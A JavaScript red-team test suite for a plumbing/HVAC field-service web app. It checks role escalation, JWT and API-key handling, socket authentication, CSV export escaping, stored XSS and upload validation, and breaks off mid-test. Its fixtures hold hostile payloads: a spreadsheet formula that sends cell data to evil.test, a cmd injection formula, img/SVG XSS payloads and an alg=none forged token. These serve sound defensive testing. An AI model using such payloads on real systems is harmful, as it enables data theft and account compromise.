/**
 * tests/redteam.test.js — Red Team / QA security & integrity suite (HTTP level).
 *
 *   TEST_DATABASE_URL=postgresql://mbc:mbc_sandbox@localhost:5432/mbc_redteam_test?schema=public \
 *     npm run test:redteam
 *
 * Each "RT-n" test encodes the SECURE / CORRECT behaviour. They FAIL against the
 * current code (that is the finding) and will pass once the issue is fixed.
 * Tests tagged "[regression]" check things that already work (SECURITY_AUDIT.md
 * claims that were verified) and should keep passing.
 *
 * How it works
 *   - Needs TEST_DATABASE_URL (a throwaway database; created + migrated if missing).
 *     It never reads .env / .env.sandbox (ENV_FILE=/dev/null) — sandbox only.
 *   - Boots `node server.js` as a child process on a free port with
 *     SANDBOX_MODE=true (Twilio/QuickBooks/Google inert), local storage in a temp
 *     dir, MAIL_DRIVER=none. Some tests boot their own short-lived server
 *     (crash test, production-config tests).
 *   - Creates its own synthetic users / customers / jobs (tagged with a run id)
 *     and deletes them afterwards. Pre-existing rows are never modified.
 *   - Every request uses its own loopback source address (127.0.x.y) so the
 *     per-IP rate limiter does not interfere; the rate-limit test pins one.
 *   - The stored-XSS test drives headless Chrome over the DevTools protocol
 *     (Node's built-in WebSocket, no extra deps). Skipped if Chrome is absent
 *     (set CHROME_PATH to point at a Chrome/Chromium binary).
 */
'use strict';

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { spawn, spawnSync } = require('child_process');
const crypto = require('crypto');
const http   = require('http');
const net    = require('net');
const fs     = require('fs');
const os     = require('os');
const path   = require('path');
const vm     = require('vm');

const BACKEND = path.join(__dirname, '..');
const TEST_DB = process.env.TEST_DATABASE_URL;
if (!TEST_DB) {
  console.error('[redteam] TEST_DATABASE_URL is required (use a throwaway database, e.g. .../mbc_redteam_test).');
  process.exit(1);
}
// Make the in-process Prisma client (fixtures) use the test DB and no env file.
process.env.DATABASE_URL = TEST_DB;
process.env.ENV_FILE = '/dev/null';

const RUN      = `rt${Date.now().toString(36)}${crypto.randomBytes(2).toString('hex')}`;
const SECRET   = crypto.randomBytes(32).toString('hex');
const PASSWORD = 'RedTeam!2345';
const TMP      = fs.mkdtempSync(path.join(os.tmpdir(), 'mbc-redteam-'));
const STORAGE  = path.join(TMP, 'storage');
const sleep    = (ms) => new Promise((r) => setTimeout(r, ms));

let prisma;           // in-process client for fixtures / assertions
let srv;              // shared server for most tests
const U = {};         // fixture users: { sa, admin, dispatcher, tech, tech2 } → { id, email, token }
const created = { users: [], customers: [], jobs: [], apiKeys: [], comms: [], invoices: [], quotes: [], pricebook: [] };

// ── Source-address rotation (defeats the per-IP limiter for unrelated tests) ──
let ipSeq = 0;
function nextIp() {
  ipSeq += 1;
  return `127.0.${1 + Math.floor(ipSeq / 250) % 250}.${1 + (ipSeq % 250)}`;
}

// ── HTTP helper ───────────────────────────────────────────────────────────────
function request(base, method, p, { token, apiKey, body, headers = {}, ip } = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(p, base);
    const h = { ...headers };
    let data;
    if (body !== undefined) {
      data = Buffer.isBuffer(body) ? body : Buffer.from(JSON.stringify(body));
      if (!Buffer.isBuffer(body)) h['Content-Type'] = h['Content-Type'] || 'application/json';
      h['Content-Length'] = data.length;
    }
    if (token)  h.Authorization = `Bearer ${token}`;
    if (apiKey) h['X-API-Key'] = apiKey;
    const rq = http.request({
      host: '127.0.0.1', port: u.port, path: u.pathname + u.search, method, headers: h,
      localAddress: ip || nextIp(),
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const buf = Buffer.concat(chunks);
        const text = buf.toString('utf8');
        let json; try { json = JSON.parse(text); } catch { json = undefined; }
        resolve({ status: res.statusCode, headers: res.headers, text, json, buf });
      });
    });
    rq.on('error', reject);
    if (data) rq.write(data);
    rq.end();
  });
}
const api = (method, p, opts) => request(srv.base, method, p, opts);

function multipart(field, filename, contentType, content) {
  const boundary = `----rt${crypto.randomBytes(8).toString('hex')}`;
  const head = Buffer.from(
    `--${boundary}\r\nContent-Disposition: form-data; name="${field}"; filename="${filename}"\r\n` +
    `Content-Type: ${contentType}\r\n\r\n`);
  const tail = Buffer.from(`\r\n--${boundary}--\r\n`);
  return { body: Buffer.concat([head, Buffer.from(content), tail]), headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` } };
}

// ── Server lifecycle ─────────────────────────────────────────────────────────
function freePort() {
  return new Promise((resolve) => {
    const s = net.createServer();
    s.listen(0, '127.0.0.1', () => { const { port } = s.address(); s.close(() => resolve(port)); });
  });
}

async function bootServer(extraEnv = {}, { timeoutMs = 20000 } = {}) {
  const port = await freePort();
  const base = `http://127.0.0.1:${port}`;
  const env = {
    PATH: process.env.PATH, HOME: process.env.HOME,
    ENV_FILE: '/dev/null',
    DATABASE_URL: TEST_DB,
    PORT: String(port),
    APP_URL: `http://localhost:${port}`,
    NODE_ENV: 'test',
    JWT_SECRET: SECRET,
    SANDBOX_MODE: 'true',
    DEMO_MODE: 'false',
    STORAGE_DRIVER: 'local',
    LOCAL_STORAGE_DIR: STORAGE,
    MAIL_DRIVER: 'none',
    BACKUP_DRIVER: 'local',
    BACKUP_DIR: path.join(TMP, 'backups'),
    BRAND_TRADE_TYPE: 'plumbing-hvac',
    TWILIO_ACCOUNT_SID: 'placeholder', TWILIO_AUTH_TOKEN: 'placeholder', TWILIO_PHONE_NUMBER: 'placeholder',
    QB_CLIENT_ID: 'placeholder', QB_CLIENT_SECRET: 'placeholder', QB_REDIRECT_URI: 'placeholder',
    GOOGLE_CLIENT_ID: 'placeholder', GOOGLE_CLIENT_SECRET: 'placeholder', GOOGLE_CALLBACK_URL: 'placeholder',
    ...extraEnv,
  };
  for (const k of Object.keys(env)) if (env[k] == null) delete env[k];
  const child = spawn(process.execPath, ['server.js'], { cwd: BACKEND, env, stdio: ['ignore', 'pipe', 'pipe'] });
  let out = '';
  child.stdout.on('data', (d) => { out += d; });
  child.stderr.on('data', (d) => { out += d; });
  const s = {
    child, port, base,
    output: () => out,
    alive: () => child.exitCode == null && child.signalCode == null,
    stop: async () => {
      if (child.exitCode == null && child.signalCode == null) {
        const gone = new Promise((r) => child.once('exit', r));
        child.kill('SIGTERM');
        await Promise.race([gone, sleep(3000)]);
        if (child.exitCode == null && child.signalCode == null) child.kill('SIGKILL');
      }
    },
  };
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (!s.alive()) return s;
    try {
      const r = await request(base, 'GET', '/api/health');
      if (r.status === 200) return s;
    } catch { /* not up yet */ }
    await sleep(150);
  }
  await s.stop();
  throw new Error(`server did not start within ${timeoutMs}ms:\n${out}`);
}

// ── Fixtures ─────────────────────────────────────────────────────────────────
async function ensureDatabase() {
  const { Client } = require('pg');
  const url = new URL(TEST_DB);
  const db = decodeURIComponent(url.pathname.replace(/^\//, ''));
  url.pathname = '/postgres';
  url.search = '';
  const c = new Client({ connectionString: url.toString() });
  await c.connect();
  try {
    const { rowCount } = await c.query('SELECT 1 FROM pg_database WHERE datname = $1', [db]);
    if (!rowCount) await c.query(`CREATE DATABASE "${db.replace(/"/g, '""')}"`);
  } finally { await c.end(); }
  const r = spawnSync(process.execPath, [path.join(BACKEND, 'scripts', 'migrate-deploy.mjs'), '--quiet'], {
    cwd: BACKEND, env: { ...process.env, DATABASE_URL: TEST_DB, ENV_FILE: '/dev/null' }, encoding: 'utf8',
  });
  if (r.status !== 0) throw new Error(`migrate-deploy failed:\n${r.stdout}\n${r.stderr}`);
}

async function mkUser(role, tag = role) {
  const bcrypt = require('bcryptjs');
  const email = `${RUN}-${tag}@redteam.test`;
  const u = await prisma.user.create({
    data: { email, password: await bcrypt.hash(PASSWORD, 4), firstName: 'RT', lastName: tag, role, active: true },
  });
  created.users.push(u.id);
  return u;
}

async function login(email, ip) {
  const r = await api('POST', '/api/auth/login', { body: { email, password: PASSWORD }, ip });
  assert.equal(r.status, 200, `login ${email}: ${r.text}`);
  return r.json.token;
}

async function mkCustomer(over = {}) {
  const c = await prisma.customer.create({
    data: { firstName: 'Aoife', lastName: `Byrne-${RUN}`, phone: '316-555-0199', address: '1 Synthetic St', city: 'Hutchinson', state: 'KS', zip: '67501', ...over },
  });
  created.customers.push(c.id);
  return c;
}

async function mkJob(customerId, over = {}) {
  const j = await prisma.job.create({ data: { title: `RT job ${RUN}`, customerId, tradeType: 'plumbing-hvac', ...over } });
  created.jobs.push(j.id);
  return j;
}

async function mkApiKey(token, scopes, name = `${RUN}-key`) {
  const r = await api('POST', '/api/api-keys', { token, body: { name, scopes } });
  assert.equal(r.status, 201, r.text);
  created.apiKeys.push(r.json.id);
  return r.json;
}

async function cleanup() {
  if (!prisma) return;
  const safe = (p) => p.catch(() => {});
  const runUsers = (await prisma.user.findMany({ where: { email: { contains: RUN } }, select: { id: true } })).map((u) => u.id);
  const userIds = [...new Set([...created.users, ...runUsers])];
  const runCustomers = (await prisma.customer.findMany({ where: { lastName: { contains: RUN } }, select: { id: true } })).map((c) => c.id);
  const custIds = [...new Set([...created.customers, ...runCustomers])];
  const jobRows = await prisma.job.findMany({
    where: { OR: [{ id: { in: created.jobs } }, { customerId: { in: custIds } }, { technicianId: { in: userIds } }, { title: { contains: RUN } }] },
    select: { id: true },
  });
  const jobIds = [...new Set([...created.jobs, ...jobRows.map((j) => j.id)])];
  await safe(prisma.invoice.deleteMany({ where: { OR: [{ id: { in: created.invoices } }, { jobId: { in: jobIds } }] } }));
  await safe(prisma.quote.deleteMany({ where: { OR: [{ id: { in: created.quotes } }, { jobId: { in: jobIds } }] } }));
  await safe(prisma.jobPart.deleteMany({ where: { jobId: { in: jobIds } } }));
  await safe(prisma.jobPhoto.deleteMany({ where: { jobId: { in: jobIds } } }));
  await safe(prisma.job.deleteMany({ where: { id: { in: jobIds } } }));
  await safe(prisma.communication.deleteMany({ where: { OR: [{ id: { in: created.comms } }, { customerId: { in: custIds } }] } }));
  await safe(prisma.customer.deleteMany({ where: { id: { in: custIds } } }));
  await safe(prisma.apiKey.deleteMany({ where: { OR: [{ id: { in: created.apiKeys } }, { createdById: { in: userIds } }] } }));
  await safe(prisma.priceBookItem.deleteMany({ where: { OR: [{ id: { in: created.pricebook } }, { name: { contains: RUN } }] } }));
  await safe(prisma.user.deleteMany({ where: { id: { in: userIds } } }));
}

before(async () => {
  await ensureDatabase();
  prisma = require('../helpers/prisma');
  srv = await bootServer();
  assert.ok(srv.alive(), `server exited at boot:\n${srv.output()}`);
  for (const [k, role] of [['sa', 'super-admin'], ['admin', 'admin'], ['dispatcher', 'dispatcher'], ['tech', 'technician'], ['tech2', 'technician']]) {
    const u = await mkUser(role, k);
    U[k] = { id: u.id, email: u.email, token: await login(u.email) };
  }
});

after(async () => {
  try { await cleanup(); } finally {
    if (srv) await srv.stop();
    if (prisma) await prisma.$disconnect().catch(() => {});
    fs.rmSync(TMP, { recursive: true, force: true });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// Authorization — user management
// ═════════════════════════════════════════════════════════════════════════════

test('RT-1a technician cannot promote themselves to super-admin via PATCH /api/users/:id', async () => {
  try {
    const r = await api('PATCH', `/api/users/${U.tech.id}`, { token: U.tech.token, body: { role: 'super-admin' } });
    const after = await prisma.user.findUnique({ where: { id: U.tech.id } });
    assert.equal(after.role, 'technician', `role escalated to ${after.role} (HTTP ${r.status})`);
    assert.equal(r.status, 403);
  } finally {
    await prisma.user.update({ where: { id: U.tech.id }, data: { role: 'technician' } });
  }
});

test('RT-1b technician cannot deactivate / edit another user (the super-admin)', async () => {
  try {
    const r = await api('PATCH', `/api/users/${U.sa.id}`, { token: U.tech.token, body: { active: false, email: `${RUN}-hijack@redteam.test` } });
    const after = await prisma.user.findUnique({ where: { id: U.sa.id } });
    assert.equal(after.active, true, `technician deactivated the super-admin (HTTP ${r.status})`);
    assert.equal(after.email, U.sa.email, 'technician changed the super-admin email');
    assert.equal(r.status, 403);
  } finally {
    await prisma.user.update({ where: { id: U.sa.id }, data: { active: true, email: U.sa.email } });
  }
});

test('RT-1c a read-only API key cannot change user roles', async () => {
  const key = await mkApiKey(U.admin.token, 'read');
  try {
    const r = await api('PATCH', `/api/users/${U.tech2.id}`, { apiKey: key.key, body: { role: 'super-admin' } });
    const after = await prisma.user.findUnique({ where: { id: U.tech2.id } });
    assert.equal(after.role, 'technician', `API key escalated a user to ${after.role} (HTTP ${r.status})`);
    assert.equal(r.status, 403);
  } finally {
    await prisma.user.update({ where: { id: U.tech2.id }, data: { role: 'technician' } });
  }
});

test('RT-7a admin (non-super) cannot create a super-admin', async () => {
  const email = `${RUN}-made-sa@redteam.test`;
  const r = await api('POST', '/api/users', { token: U.admin.token, body: { email, password: 'Xx-123456789', firstName: 'A', lastName: 'B', role: 'super-admin' } });
  const row = await prisma.user.findUnique({ where: { email } });
  assert.equal(row, null, `admin created a super-admin (HTTP ${r.status})`);
  assert.equal(r.status, 403);
});

test('RT-7b POST /api/users rejects unknown role values', async () => {
  const email = `${RUN}-god@redteam.test`;
  const r = await api('POST', '/api/users', { token: U.sa.token, body: { email, password: 'Xx-123456789', firstName: 'A', lastName: 'B', role: 'god' } });
  assert.equal(r.status, 400, `role "god" accepted: ${r.text}`);
});

test('RT-21 technician cannot read another user\'s record (GET /api/users/:id)', async () => {
  const r = await api('GET', `/api/users/${U.sa.id}`, { token: U.tech.token });
  assert.equal(r.status, 403, `technician read super-admin record: ${r.text}`);
});

// ═════════════════════════════════════════════════════════════════════════════
// Authentication — JWT lifecycle and secrets
// ═════════════════════════════════════════════════════════════════════════════

test('RT-5a token of a deactivated user is rejected', async () => {
  const u = await mkUser('technician', 'deact');
  const token = await login(u.email);
  await prisma.user.update({ where: { id: u.id }, data: { active: false } });
  const r = await api('GET', '/api/customers', { token });
  assert.equal(r.status, 401, `deactivated user still has access (HTTP ${r.status})`);
});

test('RT-5b token of a deleted user is rejected', async () => {
  const u = await mkUser('admin', 'deleted');
  const token = await login(u.email);
  await prisma.user.delete({ where: { id: u.id } });
  const r = await api('GET', '/api/customers', { token });
  assert.equal(r.status, 401, `deleted user still has access (HTTP ${r.status})`);
});

test('RT-5c demoted admin loses admin rights immediately (role read from DB, not the JWT)', async () => {
  const u = await mkUser('admin', 'demoted');
  const token = await login(u.email);
  await prisma.user.update({ where: { id: u.id }, data: { role: 'technician' } });
  const r = await api('GET', '/api/users', { token });
  assert.equal(r.status, 403, `demoted admin can still list users (HTTP ${r.status})`);
});

test('RT-6 production refuses to boot with a missing, weak or published JWT_SECRET', async () => {
  const bad = {
    unset: null,
    envExamplePlaceholder: 'change_this_to_a_random_secret_string_min_32_chars',
    sandboxExample: 'sandbox_only_jwt_secret_not_for_production_0123456789abcdef',
    short: 'secret',
  };
  const booted = [];
  for (const [label, value] of Object.entries(bad)) {
    const s = await bootServer({ NODE_ENV: 'production', JWT_SECRET: value }, { timeoutMs: 8000 }).catch(() => null);
    if (s && s.alive()) booted.push(label);
    if (s) await s.stop();
  }
  assert.deepEqual(booted, [], `server booted in production with JWT_SECRET: ${booted.join(', ')}`);
});

test('RT-23 DEMO_MODE (published demo credentials + seeded default passwords) is not served in production', async () => {
  const s = await bootServer({ NODE_ENV: 'production', DEMO_MODE: 'true', JWT_SECRET: crypto.randomBytes(32).toString('hex') }, { timeoutMs: 8000 }).catch(() => null);
  try {
    if (!s || !s.alive()) return; // refusing to boot is an acceptable fix
    const r = await request(s.base, 'GET', '/api/brand');
    assert.notEqual(r.json && r.json.demoMode, true, 'production login page advertises demo credentials (demoMode=true)');
  } finally { if (s) await s.stop(); }
});

test('[regression] alg=none and expired tokens are rejected; x-powered-by hidden', async () => {
  const b64 = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
  const none = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ id: U.sa.id, role: 'super-admin' })}.`;
  assert.equal((await api('GET', '/api/users', { token: none })).status, 401);
  const jwt = require('jsonwebtoken');
  const expired = jwt.sign({ id: U.sa.id, role: 'super-admin', exp: Math.floor(Date.now() / 1000) - 60 }, SECRET);
  assert.equal((await api('GET', '/api/users', { token: expired })).status, 401);
  const h = await api('GET', '/api/health');
  assert.equal(h.headers['x-powered-by'], undefined);
});

test('[regression] login is rate-limited (20 per 15 min per IP)', async () => {
  const ip = '127.0.254.254';
  let last;
  for (let i = 0; i < 21; i++) {
    last = await api('POST', '/api/auth/login', { ip, body: { email: `${RUN}-nobody@redteam.test`, password: 'wrong' } });
  }
  assert.equal(last.status, 429);
});

// ═════════════════════════════════════════════════════════════════════════════
// API keys
// ═════════════════════════════════════════════════════════════════════════════

test('RT-4 read-only API key cannot create or delete records (scopes enforced)', async () => {
  const key = await mkApiKey(U.admin.token, 'read');
  assert.equal((await api('GET', '/api/customers', { apiKey: key.key })).status, 200, 'read scope should still read');
  const r = await api('POST', '/api/customers', {
    apiKey: key.key,
    body: { firstName: 'Scope', lastName: `Leak-${RUN}`, phone: '1', address: 'a', city: 'c', zip: '1' },
  });
  if (r.json && r.json.id) created.customers.push(r.json.id);
  assert.equal(r.status, 403, `read-only key created a customer (HTTP ${r.status})`);
});

test('RT-22 API key stops working when its creator is deactivated', async () => {
  const owner = await mkUser('admin', 'keyowner');
  const token = await login(owner.email);
  const key = await mkApiKey(token, 'read,write');
  await prisma.user.update({ where: { id: owner.id }, data: { active: false } });
  const r = await api('GET', '/api/customers', { apiKey: key.key });
  assert.equal(r.status, 401, `key of a deactivated admin still works (HTTP ${r.status})`);
});

test('[regression] revoked API key is rejected; technicians cannot manage keys', async () => {
  const key = await mkApiKey(U.admin.token, 'read');
  assert.equal((await api('DELETE', `/api/api-keys/${key.id}`, { token: U.admin.token })).status, 200);
  assert.equal((await api('GET', '/api/customers', { apiKey: key.key })).status, 401);
  assert.equal((await api('GET', '/api/api-keys', { token: U.tech.token })).status, 403);
});

// ═════════════════════════════════════════════════════════════════════════════
// Authorization — destructive operations by field roles
// ═════════════════════════════════════════════════════════════════════════════

test('RT-8a technician cannot delete jobs', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const r = await api('DELETE', `/api/jobs/${j.id}`, { token: U.tech.token });
  const still = await prisma.job.findUnique({ where: { id: j.id } });
  assert.ok(still, `technician deleted job #${j.id} (HTTP ${r.status})`);
  assert.equal(r.status, 403);
});

test('RT-8b technician cannot delete customers', async () => {
  const c = await mkCustomer();
  const r = await api('DELETE', `/api/customers/${c.id}`, { token: U.tech.token });
  const still = await prisma.customer.findUnique({ where: { id: c.id } });
  assert.ok(still, `technician deleted customer #${c.id} (HTTP ${r.status})`);
  assert.equal(r.status, 403);
});

test('RT-8c technician and dispatcher cannot change price-book prices', async () => {
  const item = await prisma.priceBookItem.create({ data: { industry: 'Plumbing & HVAC', category: 'Labor', name: `RT item ${RUN}`, price: 150 } });
  created.pricebook.push(item.id);
  for (const who of ['tech', 'dispatcher']) {
    const r = await api('PATCH', `/api/pricebook/${item.id}`, { token: U[who].token, body: { price: -100 } });
    const now = await prisma.priceBookItem.findUnique({ where: { id: item.id } });
    assert.equal(now.price, 150, `${who} changed price to ${now.price} (HTTP ${r.status})`);
    assert.equal(r.status, 403);
  }
});

test('RT-8d technician cannot delete the customer communication log (audit trail)', async () => {
  const c = await mkCustomer();
  const comm = await prisma.communication.create({ data: { customerId: c.id, type: 'call', subject: 'Quoted €500 on the phone' } });
  created.comms.push(comm.id);
  const r = await api('DELETE', `/api/communications/${comm.id}`, { token: U.tech.token });
  const still = await prisma.communication.findUnique({ where: { id: comm.id } });
  assert.ok(still, `technician deleted communication #${comm.id} (HTTP ${r.status})`);
});

test('RT-16 technician cannot send ad-hoc SMS to arbitrary numbers', async () => {
  const r = await api('POST', '/api/sms/send', { token: U.tech.token, body: { to: '+15555550100', body: `Pay here http://evil.test ${RUN}` } });
  assert.equal(r.status, 403, `technician may send arbitrary SMS (HTTP ${r.status})`);
});

test('[regression] billing writes are admin-only; backups/exports/users list are admin-only', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  assert.equal((await api('POST', '/api/quotes',   { token: U.tech.token, body: { jobId: j.id, amount: 10 } })).status, 403);
  assert.equal((await api('POST', '/api/invoices', { token: U.dispatcher.token, body: { jobId: j.id, amount: 10 } })).status, 403);
  assert.equal((await api('POST', '/api/backup/run', { token: U.tech.token })).status, 403);
  assert.equal((await api('GET', '/api/backup/list', { token: U.dispatcher.token })).status, 403);
  assert.equal((await api('GET', '/api/exports/customers', { token: U.tech.token })).status, 403);
  assert.equal((await api('GET', '/api/users', { token: U.tech.token })).status, 403);
});

// ═════════════════════════════════════════════════════════════════════════════
// Socket.io presence
// ═════════════════════════════════════════════════════════════════════════════

function socketSession(base, frames, { waitMs = 600 } = {}) {
  return new Promise((resolve) => {
    const got = [];
    let ws;
    try { ws = new WebSocket(`${base.replace(/^http/, 'ws')}/socket.io/?EIO=4&transport=websocket`); } catch (e) { resolve({ got, error: e.message }); return; }
    const done = () => { try { ws.close(); } catch { /* ignore */ } resolve({ got }); };
    ws.onmessage = (m) => {
      const d = String(m.data);
      got.push(d);
      if (d.startsWith('0{')) ws.send('40');
      else if (d.startsWith('40')) { for (const f of frames) ws.send(f); setTimeout(done, waitMs); }
      else if (d.startsWith('44')) setTimeout(done, 50);
      else if (d === '2') ws.send('3');
    };
    ws.onerror = () => setTimeout(done, 50);
    setTimeout(done, waitMs + 2000);
  });
}

test('RT-2 malformed unauthenticated socket event does not crash the server', async () => {
  const s = await bootServer();
  try {
    await socketSession(s.base, ['42["viewing-job",{"jobId":1}]', '42["viewing-job",null]']);
    await sleep(500);
    assert.ok(s.alive(), `server process died:\n${s.output().split('\n').slice(-8).join('\n')}`);
    const h = await request(s.base, 'GET', '/api/health').catch((e) => ({ status: e.code }));
    assert.equal(h.status, 200);
  } finally { await s.stop(); }
});

test('RT-14a Socket.io refuses unauthenticated connections', async () => {
  const { got } = await socketSession(srv.base, []);
  const accepted = got.some((f) => f.startsWith('40'));
  assert.equal(accepted, false, `unauthenticated socket connected: ${JSON.stringify(got)}`);
});

test('RT-14b presence REST endpoints require authentication', async () => {
  assert.equal((await api('GET', '/api/presence')).status, 401);
  assert.equal((await api('GET', '/api/presence/1')).status, 401);
});

// ═════════════════════════════════════════════════════════════════════════════
// Injection / XSS / headers
// ═════════════════════════════════════════════════════════════════════════════

test('RT-10 CSV exports neutralise spreadsheet formulas', async () => {
  const c = await mkCustomer({ firstName: '=HYPERLINK("http://evil.test/?d="&B2,"Invoice")', email: '@SUM(1+1)', phone: '+1 =cmd|/c calc!A0', address: '-2+3' });
  const r = await api('GET', '/api/exports/customers', { token: U.admin.token });
  assert.equal(r.status, 200);
  const line = r.text.split('\n').find((l) => l.startsWith(`"${c.id}",`));
  assert.ok(line, 'customer row missing from export');
  const cells = line.match(/"((?:[^"]|"")*)"/g).map((x) => x.slice(1, -1).replace(/""/g, '"'));
  const dangerous = cells.filter((v) => /^[=+\-@\t\r]/.test(v));
  assert.deepEqual(dangerous, [], 'formula-leading cells must be escaped (e.g. prefixed with \')');
});

test('RT-15 HTML pages are served with a Content-Security-Policy', async () => {
  const r = await api('GET', '/index.html');
  assert.equal(r.status, 200);
  assert.ok(r.headers['content-security-policy'], 'no Content-Security-Policy header (helmet CSP disabled)');
});

test('RT-25 every inline <script> in public/*.html parses (pages are not dead on arrival)', () => {
  const broken = [];
  const dir = path.join(BACKEND, 'public');
  for (const f of fs.readdirSync(dir).filter((x) => x.endsWith('.html'))) {
    const html = fs.readFileSync(path.join(dir, f), 'utf8');
    const re = /<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/gi;
    let m;
    while ((m = re.exec(html))) {
      try { new vm.Script(m[1], { filename: f }); } catch (e) { broken.push(`${f}: ${e.message}`); }
    }
  }
  assert.deepEqual(broken, []);
});

// Minimal Chrome DevTools Protocol driver (Node 22 global WebSocket, no deps).
function findChrome() {
  const c = [process.env.CHROME_PATH, '/usr/bin/google-chrome', '/usr/bin/chromium', '/usr/bin/chromium-browser',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'].filter(Boolean);
  return c.find((p) => fs.existsSync(p));
}

async function withChrome(fn) {
  const exe = findChrome();
  const profile = fs.mkdtempSync(path.join(TMP, 'chrome-'));
  const proc = spawn(exe, ['--headless=new', '--no-sandbox', '--disable-gpu', '--remote-debugging-port=0', `--user-data-dir=${profile}`, 'about:blank'], { stdio: ['ignore', 'ignore', 'pipe'] });
  const wsUrl = await new Promise((resolve, reject) => {
    let err = '';
    const t = setTimeout(() => reject(new Error(`chrome did not start: ${err}`)), 15000);
    proc.stderr.on('data', (d) => {
      err += d;
      const m = /DevTools listening on (ws:\S+)/.exec(err);
      if (m) { clearTimeout(t); resolve(m[1]); }
    });
  });
  const ws = new WebSocket(wsUrl);
  await new Promise((r, j) => { ws.onopen = r; ws.onerror = j; });
  let id = 0;
  const pending = new Map();
  const listeners = [];
  ws.onmessage = (m) => {
    const msg = JSON.parse(String(m.data));
    if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id); }
    else listeners.forEach((l) => l(msg));
  };
  const send = (method, params = {}, sessionId) => new Promise((resolve) => {
    id += 1; pending.set(id, resolve);
    ws.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
  });
  try {
    const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });
    const { result: { sessionId } } = await send('Target.attachToTarget', { targetId, flatten: true });
    await send('Page.enable', {}, sessionId);
    const page = {
      async goto(url, settleMs = 1500) {
        const loaded = new Promise((r) => {
          const l = (msg) => { if (msg.sessionId === sessionId && msg.method === 'Page.loadEventFired') { listeners.splice(listeners.indexOf(l), 1); r(); } };
          listeners.push(l);
        });
        await send('Page.navigate', { url }, sessionId);
        await Promise.race([loaded, sleep(10000)]);
        await sleep(settleMs);
      },
      async eval(expression) {
        const r = await send('Runtime.evaluate', { expression, returnByValue: true, awaitPromise: true }, sessionId);
        return r.result && r.result.result ? r.result.result.value : undefined;
      },
    };
    return await fn(page);
  } finally {
    try { ws.close(); } catch { /* ignore */ }
    proc.kill('SIGKILL');
  }
}

test('RT-3 stored XSS: customer/job data is rendered as text, not HTML (headless Chrome)', { skip: !findChrome() && 'Chrome not found (set CHROME_PATH)' }, async () => {
  const payload = (tag) => `<img src=x onerror="window.__rtxss=(window.__rtxss||[]).concat('${tag}')">`;
  const c = await mkCustomer({ firstName: payload('customer.firstName'), notes: payload('customer.notes'), address: payload('customer.address') });
  const today = new Date().toISOString().slice(0, 10);
  await mkJob(c.id, { title: payload('job.title'), notes: payload('job.notes'), scheduledDate: today, scheduledTime: '09:00', technicianId: U.tech.id, status: 'scheduled' });
  const comm = await prisma.communication.create({ data: { customerId: c.id, type: 'note', subject: payload('comm.subject'), body: payload('comm.body') } });
  created.comms.push(comm.id);
  // The browser is a single client on 127.0.0.1; this suite never otherwise uses that address.
  const fired = await withChrome(async (page) => {
    await page.goto(`${srv.base}/index.html`, 300);
    await page.eval(`localStorage.setItem('token', ${JSON.stringify(U.sa.token)})`);
    const hits = {};
    for (const p of ['communications.html', 'schedule.html', 'dispatch.html', 'customers.html', `customer-detail.html?id=${c.id}`, 'index.html', 'job.html?id=' + created.jobs[created.jobs.length - 1]]) {
      await page.goto(`${srv.base}/${p}`);
      if (p === 'communications.html') {
        await page.eval(`(()=>{const s=document.getElementById('customer-filter');if(s){s.value='${c.id}';s.dispatchEvent(new Event('change'));}})()`);
        await sleep(1000);
      }
      const v = await page.eval('window.__rtxss || null');
      if (v) hits[p] = v;
    }
    return hits;
  });
  assert.deepEqual(fired, {}, 'stored XSS payloads executed');
});

// ═════════════════════════════════════════════════════════════════════════════
// Uploads
// ═════════════════════════════════════════════════════════════════════════════

test('RT-20a uploads with an image/* label but non-image bytes (HTML) are rejected', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const mp = multipart('photo', 'invoice.png', 'image/png', '<html><script>alert(document.domain)</script></html>');
  const r = await api('POST', `/api/jobs/${j.id}/photos`, { token: U.tech.token, body: mp.body, headers: mp.headers });
  assert.equal(r.status, 400, `HTML accepted as image/png (HTTP ${r.status})`);
});

test('RT-20b SVG uploads are rejected or served as an attachment', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const mp = multipart('photo', 'x.svg', 'image/svg+xml', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>');
  const r = await api('POST', `/api/jobs/${j.id}/photos`, { token: U.tech.token, body: mp.body, headers: mp.headers });
  if (r.status === 400 || r.status === 415) return;
  assert.equal(r.status, 201, r.text);
  const raw = await api('GET', r.json.url, { token: U.tech.token });
  const cd = raw.headers['content-disposition'] || '';
  const csp = raw.headers['content-security-policy'] || '';
  assert.ok(/attachment/i.test(cd) || /sandbox/i.test(csp), 'active SVG served inline from the app origin');
});

test('RT-17d oversize upload returns 413, not 500', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const mp = multipart('photo', 'big.png', 'image/png', Buffer.alloc(10 * 1024 * 1024 + 1024));
  const r = await api('POST', `/api/jobs/${j.id}/photos`, { token: U.tech.token, body: mp.body, headers: mp.headers });
  assert.equal(r.status, 413, `HTTP ${r.status}: ${r.text.slice(0, 120)}`);
});

test('RT-19 deleting a job removes its photo files from storage (no orphans)', async () => {
  const c = await mkCustomer();
  const j = await mkJob(c.id);
  const png = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c6360000002000154a24f5d0000000049454e44ae426082', 'hex');
  const mp = multipart('photo', 'leak.png', 'image/png', png);
  const up = await api('POST', `/api/jobs/${j.id}/photos`, { token: U.admin.token, body: mp.body, headers: mp.headers });
  assert.equal(up.status, 201, up.text);
  const photo = await prisma.jobPhoto.findUnique({ where: { id: up.json.id } });
